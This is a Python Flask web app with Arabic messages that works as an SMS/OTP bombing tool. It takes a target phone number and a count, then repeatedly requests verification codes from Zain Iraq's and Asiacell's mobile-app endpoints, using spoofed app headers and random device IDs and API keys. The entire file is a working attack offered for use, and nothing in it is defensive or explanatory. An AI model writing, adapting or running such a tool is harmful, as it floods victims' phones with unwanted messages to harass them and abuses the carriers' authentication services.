from flask import Flask, render_template, request, jsonify
import requests
import threading
import time
from uuid import uuid4

app = Flask(__name__)
stop_flag = False

def send_ethir_spam(phone_number, spam_count):
    global stop_flag
    count = 0
    while not stop_flag and count < spam_count:
        count += 1
        headers = {
            'Host': 'mw-mobileapp.iq.zain.com',
            'Accept': '*/*',
            'Content-Type': 'application/json',
            'User-Agent': 'Zain Iraq iq.zain/3.10 Coder',
            'Connection': 'close'
        }
        data = {'msisdn': phone_number, 'user_space': 'mbb'}
        try:
            response = requests.post('https://mw-mobileapp.iq.zain.com/api/otp/request', headers=headers, json=data).text
            if '"status": "success"' in response:
                print(f"[ETHIR] تم الإرسال: {count}/{spam_count}")
            else:
                print("خطأ أثناء الإرسال.")
                break
        except Exception as e:
            print(f"خطأ: {e}")
            break
        time.sleep(1)

def send_asia_spam(phone_number, spam_count):
    global stop_flag
    count = 0
    while not stop_flag and count < spam_count:
        count += 1
        url = 'https://odpapp.asiacell.com/api/v1/login?lang=ar'
        headers = {
            'X-ODP-API-KEY': str(uuid4()),
            'DeviceID': str(uuid4()),
            'X-OS-Version': '13',
            'X-Device-Type': '[Android][heros][heros-LX2 13] [TIRAMISU]',
            'X-ODP-APP-VERSION': '3.8.0',
            'X-FROM-APP': 'odp',
            'X-ODP-CHANNEL': 'mobile',
            'X-SCREEN-TYPE': 'MOBILE',
            'Content-Type': 'application/json; charset=UTF-8',
            'Host': 'odpapp.asiacell.com',
            'User-Agent': 'okhttp/5.0.0-alpha.2',
        }
        data = {"captchaCode": "", "username": phone_number}
        try:
            response = requests.post(url, headers=headers, json=data).text
            if 'success' in response:
                print(f"[ASIA] تم الإرسال: {count}/{spam_count}")
            else:
                print("خطأ أثناء الإرسال.")
                break
        except Exception as e:
            print(f"خطأ: {e}")
            break
        time.sleep(1)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/start_spam', methods=['POST'])
def start_spam():
    global stop_flag
    stop_flag = False
    data = request.json
    phone = data['phone']
    count = int(data['count'])
    spam_type = data['type']
    if spam_type == 'ethir':
        threading.Thread(target=send_ethir_spam, args=(phone, count)).start()
    elif spam_type == 'asia':
        threading.Thread(target=send_asia_spam, args=(phone, count)).start()
    return jsonify({"status": "success", "message": "بدأ الإرسال."})

@app.route('/stop_spam', methods=['POST'])
def stop_spam():
    global stop_flag
    stop_flag = True
    return jsonify({"status": "success", "message": "تم إيقاف الإرسال."})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
